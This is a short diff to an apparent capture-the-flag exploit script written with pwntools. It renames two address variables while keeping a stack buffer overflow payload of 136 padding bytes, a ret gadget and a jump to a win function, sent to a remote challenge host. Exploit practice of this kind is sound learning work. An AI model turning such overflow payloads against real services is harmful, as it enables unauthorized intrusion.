@@ -27,12 +27,12 @@ exe = context.binary = ELF(args.EXE or 'combats')
 
 p = remote("challenges.hackagou.nc", 5003)
 
-guerrier_addr = 0x4011d8
-ret_addr = 0x40101a
+warrior = 0x4011d8
+ret = 0x40101a
 
 payload = b'A' * 136
-payload += p64(ret_addr)
-payload += p64(guerrier_addr)
+payload += p64(ret)
+payload += p64(warrior)
 
 p.readuntil(b'> ')
 p.sendline(payload)
